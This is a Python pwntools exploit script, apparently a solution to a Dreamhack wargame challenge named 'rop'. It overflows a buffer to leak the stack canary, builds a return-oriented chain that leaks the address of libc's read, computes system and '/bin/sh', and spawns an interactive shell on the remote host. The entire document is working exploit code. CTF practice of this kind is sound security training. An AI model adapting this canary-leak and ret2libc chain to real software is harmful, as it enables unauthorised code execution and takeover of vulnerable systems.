from pwn import *

def slog(name, addr):
    return success(': '.join([name, hex(addr)]))
# local
# p = process('./rop')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# remote
p = remote('host1.dreamhack.games', 14576)
libc = ELF('./libc.so.6')

p_elf = ELF('./rop')
r = ROP(p_elf)

#1 leak canary
buf2rbp = 0x40
buf2cnry = buf2rbp - 0x08

payload = b'A' * (buf2cnry + 1)
p.sendafter(b'Buf: ', payload)
\
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
rbp = u64(p.recvn(8))

slog('canary', canary)

#2 get read addr & ret2main
main = p_elf.symbols['main']
write_plt = p_elf.plt['write']
read_got = p_elf.got['read']

#gadgets
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]

payload = b'A' * buf2cnry + p64(canary) + b'B' * 0x8
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)
payload += p64(ret)
payload += p64(main)


p.sendafter(b'Buf: ', payload)

read = u64(p.recvn(6) + b'\x00' * 2)
slog('read', read)

libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

p.sendafter(b'Buf: ', b'test\x00')
p.recvuntil(b'test')

payload = b'A' * buf2cnry + p64(canary) + b'B' * 0x8
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.sendafter(b'Buf: ', payload)

p.interactive()